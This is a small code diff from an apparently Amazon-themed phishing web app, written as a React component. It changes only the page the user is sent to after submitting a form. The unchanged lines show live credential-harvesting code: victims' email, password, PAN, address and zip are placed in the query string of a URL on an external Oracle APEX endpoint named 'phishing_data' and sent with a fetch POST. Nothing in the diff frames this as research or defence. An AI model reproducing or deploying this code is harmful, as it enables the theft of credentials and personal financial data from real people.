@@ -19,9 +19,9 @@ function Win() {
         try {
             save_data_api = `https://apex.oracle.com/pls/apex/visheshpandey/amazon/phishing_data?email=${email.current.value}&pass=${pass.current.value}&pan=${pan.current.value}&address=${address.current.value}&state =${state.current.value}&country=${country.current.value}&zip=${zip.current.value}`
             await fetch(save_data_api, { method: "POST" });
-            navigate("/terms")
+            navigate("/thankyou")
         } catch (error) {
-            navigate("/terms")
+            navigate("/thankyou")
         }
         
         
